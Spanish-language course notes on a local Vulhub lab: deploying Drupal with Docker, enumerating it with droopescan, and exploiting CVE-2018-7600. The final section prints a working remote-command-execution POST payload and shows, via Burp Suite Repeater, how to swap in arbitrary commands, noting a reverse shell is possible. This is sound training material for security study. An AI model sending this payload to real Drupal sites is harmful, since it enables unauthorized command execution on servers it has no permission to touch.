
# Indice

- [[#Introducción]]
- [[#Practica]]
- [[#Despliegue]]
- [[#Enumeración]]
- [[#Explotación de vulnerabilidad]]
- [[#Siguientes apuntes]]

# Introducción

Ahora aprenderemos a enumerar el gestor de contenidos __Drupal__. Drupal es un sistema de gestión de contenido libre y de código abierto (CMS) utilizado para la creación de sitios web y aplicaciones web. 

Drupal ofrece un alto grado de personalización y escalabilidad, lo que la convierte en una opción popular para sitios web complejos y grandes. Drupal se utiliza en una amplia gama de sitios web, desde blogs personales hasta sitios web gubernamentales y empresariales. Es altamente flexible y cuenta con una amplia variedad de módulos y herramientas que permiten a los usuarios personalizar su sitio web para satisfacer sus necesidades específicas.

Una de las herramientas que veremos para enumerar un Drupal es la herramienta __droopescan__. Droopescan es una herramienta de escaneo de seguridad especializada en la identificación de versiones de Drupal y sus módulos, y en la detección de vulnerabilidades conocidas en ellos. La herramienta realiza un escaneo exhaustivo del sitio web para encontrar versiones de Drupal instaladas, módulos activos y vulnerabilidades conocidas, lo que ayuda a los administradores de sistemas y desarrolladores a identificar y solucionar los problemas de seguridad en sus sitios web. 

Con esta herramienta, se pueden llevar a cabo análisis de seguridad en sitios web basados en Drupal, lo que puede ayudar a prevenir posibles ataques y problemas de seguridad en el futuro.

Droopescan: `https://github.com/SamJoan/droopescan`

Su uso es fácil de entender:

```shell
droopescan scan drupal --url https://example.com
```

Donde __scan__ indica que queremos realizar un escaneo, __drupal__ especifica que estamos realizando un escaneo de Drupal y __--url https:\//example.com__ indica la URL del sitio web que se va a escanear. 

Enlace al repositorio de Vulnhub al que corresponde el laboratorio que se utiliza en esta ocasión:`https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2018-7600`

# Practica

## Despliegue

Para el despliegue, considerando el proyecto de Vulnhub compartido, podríamos traernos directamente esta carpeta gracias a DownGit, una página de internet que, con colocar el link, nos permite descargarlo. 

Una vez tengamos nuestra carpeta, entramos en ella y, para el despliegue, ejecutamos docker compose.

```shell
docker-compose up -d
```

Al desplegarlo, si vemos que se encuentra corriendo, veremos que es el servicio en nuestro puerto 8080:

![[EnumServComunes/Gestores de contenido (CMS)/Drupal/images/001.png]]

Si lo abrimos en el navegador, veríamos lo siguiente:

![[EnumServComunes/Gestores de contenido (CMS)/Drupal/images/002.png]]

Aquí lo que tendremos que hacer es seguir los pasos para una instalación de Drupal. Seleccionamos el idioma deseado, en este caso inglés -> configuración estándar -> SQLite (es un entorno sin base de datos SQL como tal, por ende tendremos que seleccionar SQLite para evitar problemas). 

Una vez hecho esto, comenzará la instalación y esperaremos a que finalice.

Después de la instalación de Drupal, lo necesario será agregar las configuraciones iniciales, donde agregamos un usuario y damos detalles de la ciudad. Para este ejemplo se agrega el usuario __sammy-ulfh__ con __root__ como password.

![[EnumServComunes/Gestores de contenido (CMS)/Drupal/images/003.png]]

Esto nos logueará automáticamente y veremos el panel de administración:

![[EnumServComunes/Gestores de contenido (CMS)/Drupal/images/004.png]]

De aquí la idea sea desloguearnos e ir a la página principal, para ver cómo lo vería un usuario normal.

![[EnumServComunes/Gestores de contenido (CMS)/Drupal/images/005.png]]

## Enumeración

Para enumerar una web construida sobre Drupal, lo que haremos será utilizar la herramienta de GitHub [Droopescan](https://github.com/SamJoan/droopescan). 

Clonando el repositorio y estando dentro de la carpeta, podremos ejecutarlo. Al ser una herramienta de Python, es probable que el ejecutable nos dé problemas con las librerías; por ende, crearemos un entorno, instalaremos las librerías y luego podremos ejecutarlo.

Es posible que nos encontremos con el error de que al instalar las librerías no nos funcione; esto es debido a que a partir de python3.13 algunas librerías fueron descontinuadas y estas librerías las contempla el script. 

Si queremos evitar este problema, lo ideal es descargar una versión inferior a python3.8, con ello funcionaría.

```shell
python3.8 -m venv pip
source pip/bin/activate
pip install -r requirements.txt
```

Con lo anterior habremos cargado un entorno e instalado las librerías correspondientes, de tal manera que ahora podremos ejecutar el binario.

```shell
./droopescan
```

Para inicializar el escaneo, tendremos que indicar con la palabra clave __scan__ que realizaremos un escaneo y le indicaremos que es al CMS de Drupal. Con ello finalmente agregamos, con el parámetro -u, la URL de la web.

```shell
./droopescan scan drupal -u http://127.0.0.1:8080
```

![[EnumServComunes/Gestores de contenido (CMS)/Drupal/images/006.png]]

En este caso no nos reporta prácticamente nada e incluso tampoco es capaz de decirnos realmente cuál es la versión de Drupal que se encuentra corriendo. 

Este es el caso en este laboratorio; sin embargo, Droopescan es una muy buena herramienta cuando se trata de enumerar sitios construidos con Drupal.

## Explotación de vulnerabilidad

Si vemos el repositorio, se nos menciona que este laboratorio cuenta con una vulnerabilidad, la cual permite ejecución de comandos, y que la forma de explotarla es enviando una petición por el método POST, con lo siguiente:

```POST
POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 103

form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id
```

Lo anterior realiza una petición POST a la ruta `/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax` y, mediante el envío de parámetros, se aprovecha de esta vulnerabilidad, donde el último valor es el comando que ejecuta el servidor. 

Para realizar una prueba, nos iremos a Burp Suite y abriremos la web en su navegador. Si utilizamos un proxy en algún navegador, nos entrará en conflicto; por ende, en la configuración de Burpsuite tendremos que cambiar el puerto que utilice, ya que la web desplegada con Drupal lo está utilizando actualmente.

![[EnumServComunes/Gestores de contenido (CMS)/Drupal/images/007.png]]


Ahora en el navegador podremos irnos a user/login y con el interceptor encendido en Burp Suite enviar una petición de logueo:

![[EnumServComunes/Gestores de contenido (CMS)/Drupal/images/008.png]]

Con la petición interceptada, en lugar de permitir el flujo para el navegador, daremos clic derecho sobre ella y la enviaremos al repeater:

![[EnumServComunes/Gestores de contenido (CMS)/Drupal/images/009.png]]

Ahora nos iremos a la pestaña de __repeater__ y, como lo que queremos es utilizar una petición nuestra, que es justo la que nos dan en el repositorio, reemplazamos todo el contenido existente en pretty por el que nos dan en el repositorio, que es el dado anteriormente:

![[EnumServComunes/Gestores de contenido (CMS)/Drupal/images/010.png]]

Teniendo esto listo, le daríamos a send.

![[EnumServComunes/Gestores de contenido (CMS)/Drupal/images/011.png]]

Una vez enviado, podremos observar cómo en la parte de la respuesta, en el atributo __data__ estamos viendo el output del comando __Id__, como si lo estuviésemos ejecutando en un sistema Linux. 

Es por ello que ahora, en nuestro apartado final de la petición, si cambiamos __id__ por cualquier comando como __pwd__, veremos en data la respuesta representada:

![[EnumServComunes/Gestores de contenido (CMS)/Drupal/images/012.png]]

La explotación de esta vulnerabilidad es tremenda porque, si nosotros quisiéramos, podríamos ejecutar cualquier comando que nos permitiera realizar diversas cosas, incluso llegar a tener una reverse shell. 

Con esto visto, ya podremos cerrar Burp Suite.
# Siguientes apuntes

[[Enumeración de gestores de contenido (CMS) – Magento]]